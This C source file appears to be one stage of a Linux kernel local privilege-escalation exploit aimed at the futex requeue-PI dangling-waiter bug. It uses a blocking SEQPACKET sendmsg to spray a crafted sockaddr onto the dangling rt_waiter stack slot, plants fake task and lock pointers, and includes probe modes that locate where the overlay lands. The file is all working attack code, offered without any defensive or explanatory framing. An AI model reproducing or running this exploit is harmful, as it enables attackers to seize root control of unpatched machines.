/* seqoverlay.c — SEQPACKET overlay fingerprint/graft (§124.120).
 * Adds a deterministic 40B stack overlay on the waiter thread BEFORE the
 * requeue trigger fires, replacing the 2% true-stack-residue lottery.
 * Independent file: does not touch the Path-A trigger main road.
 * Gated by env SEQOVL_MODE: 0=off (default), 1=A(pattern fault probe),
 * 2=B(Fake_task), 3=C(full graft per diff table). */
#include "common.h"
#include <sys/socket.h>

/* §124.123 W-discipline: raw write, no stdio in the handler. pr_info takes
   libc locks with deep frames that can re-stomp the waiter slot AFTER the
   overlay has landed. */
static void seqovl_raw(const char *s) {
  write(STDOUT_FILENO, s, strlen(s));
  fsync(STDOUT_FILENO);
}

#define SEQOVL_LEN 48
#define SEQOVL_PATTERN_A 0xDEADBEEFDEADBEEFULL

/* 5.10 overlay map (base = waiter+0x28 assumption, verified by fingerprint):
 * +0 = rb_left (zero), +8 = task, +16 = lock, +24 = prio(1),
 * +28 = zero, +32 = deadline(0). Only 40B sent (waiter ends 0x50). */
static void seqovl_fill(unsigned char *ov, uint64_t task_val, int mode) {
  memset(ov, 0, SEQOVL_LEN);
  if (mode == 1) {
    /* A-round landing probe: fill the WHOLE 40B with the non-canonical
       pattern so that whichever waiter field the overlay lands on (task,
       lock, prio, rb_left, ...), a walk deref faults. A live round means
       the overlay did NOT cover any deref'd waiter field. */
    for (int i = 0; i + 8 <= SEQOVL_LEN; i += 8) {
      uint64_t p = SEQOVL_PATTERN_A;
      memcpy(ov + i, &p, 8);
    }
    return;
  }
  if (mode == 4) {
    /* §124.124 single-slot landing bisection: put the non-canonical pattern
       in ONE 8-byte slot of the 40B overlay (offset from env SEQOVL_OFF) so
       that a walk fault pins which waiter field the overlay actually covers. */
    const char *o = getenv("SEQOVL_OFF");
    int off = o ? atoi(o) : 16;
    if (off >= 0 && off + 8 <= SEQOVL_LEN) {
      uint64_t p = SEQOVL_PATTERN_A;
      memcpy(ov + off, &p, 8);
    }
    return;
  }
  if (mode == 5) {
    /* §124.124 shifted landing (base = waiter+0x20): task->ov+16, lock->ov+24,
       prio->ov+32, deadline->ov+40. */
    uint64_t lk = (uint64_t)fake_lock, pr = 1, dl = 0;
    memcpy(ov + 16, &task_val, 8);
    memcpy(ov + 24, &lk, 8);
    memcpy(ov + 32, &pr, 8);
    memcpy(ov + 40, &dl, 8);
    return;
  }
  memcpy(ov + 8, &task_val, 8);
  {
    uint64_t lk = (uint64_t)fake_lock;
    memcpy(ov + 16, &lk, 8);
  }
  {
    uint32_t prio = 1;
    memcpy(ov + 24, &prio, 4);
  }
  /* deadline bytes 32..39 stay zero (sabrina CAL: 0). */
}

static int seqovl_mode(void) {
  const char *e = getenv("SEQOVL_MODE");
  if (!e || !*e) return 0;
  return atoi(e);
}

/* Sentinel: Fake page 0x500 must hold a canonical nonzero addr so that
 * __rb_change_child takes the has-parent branch and writes it.
 * Dump 0x500/0x508 before+after for the oracle. */
static void seqovl_sentinel_arm(void) {
  if (!page_base) return;
  /* Q3: clear both words first so a post-mortem write is unambiguous
   * (stale content from a previous round would false-positive). */
  payload_patch64(0x500, 0);
  payload_patch64(0x508, 0);
  payload_patch64(0x500, page_base + 0x520);
}

static void seqovl_sentinel_dump(const char *tag) {
  unsigned char *p = NULL;
  /* read back via the host-side template (post-walk ground truth needs
   * the device-side readback; this logs intent + host values). */
  (void)p;
  {
    char b[96];
    int n = snprintf(b, sizeof(b), "seqovl sentinel %s page=0x%zx\n",
                     tag, (size_t)page_base);
    if (n > 0) seqovl_raw(b);
  }
}

/* Fire one blocking SEQPACKET sendmsg carrying the overlay. SO_SNDTIMEO 3s
 * keeps the handler parked on the overlay while the chain walks. */
void seqoverlay_once(void) {
  int mode = seqovl_mode();
  if (mode < 1 || mode > 5) return;
  if (!page_base || !fake_lock || !fake_task) {
    seqovl_raw("seqovl: missing page/lock/task, skipping\n");
    return;
  }

  uint64_t task_val;
  if (mode == 1) {
    task_val = SEQOVL_PATTERN_A;
  } else {
    task_val = (uint64_t)fake_task;
  }

  unsigned char ov[SEQOVL_LEN];
  seqovl_fill(ov, task_val, mode);

  seqovl_sentinel_arm();
  seqovl_sentinel_dump("pre");

  int sv[2];
  if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, sv) < 0) {
    seqovl_raw("seqovl: socketpair failed, skipping\n");
    return;
  }
  /* Fill sender wmem so our sendmsg blocks on the overlay. */
  {
    struct timeval tv = {.tv_sec = 3, .tv_usec = 0};
    setsockopt(sv[0], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  }
  {
    struct sockaddr_storage addr;
    memset(&addr, 0, sizeof(addr));
    memcpy(&addr, ov, SEQOVL_LEN);
    struct iovec iov;
    static char sdata[64];
    memset(sdata, 0x41, sizeof(sdata));
    iov.iov_base = sdata;
    iov.iov_len = sizeof(sdata);
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &addr;
    msg.msg_namelen = 128;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    {
      char b[96];
      int n = snprintf(b, sizeof(b), "seqovl: mode=%d task=0x%zx firing\n",
                       mode, (size_t)task_val);
      if (n > 0) seqovl_raw(b);
    }
    {
      ssize_t r = sendmsg(sv[0], &msg, 0);
      char b[96];
      int n = snprintf(b, sizeof(b), "seqovl: sendmsg ret=%zd e=%d\n",
                       r, r < 0 ? errno : 0);
      if (n > 0) seqovl_raw(b);
    }
  }
  close(sv[0]);
  close(sv[1]);
  seqovl_sentinel_dump("post");
}

int seqoverlay_enabled(void) {
  return seqovl_mode() >= 1;
}

/* §124.121 handler: runs ON the pr_waiter thread (SIGUSR1 from the main
   thread just before the requeue trigger). Same thread + same syscall depth
   as the blocked FUTEX_WAIT_REQUEUE_PI, so the sendmsg sockaddr lands on
   the dangling rt_waiter slot. Blocking sendmsg (3s) parks the waiter on
   the overlay while the main thread fires the requeue. */
void seqoverlay_handler(int sig) {
  (void)sig;
  seqoverlay_once();
}
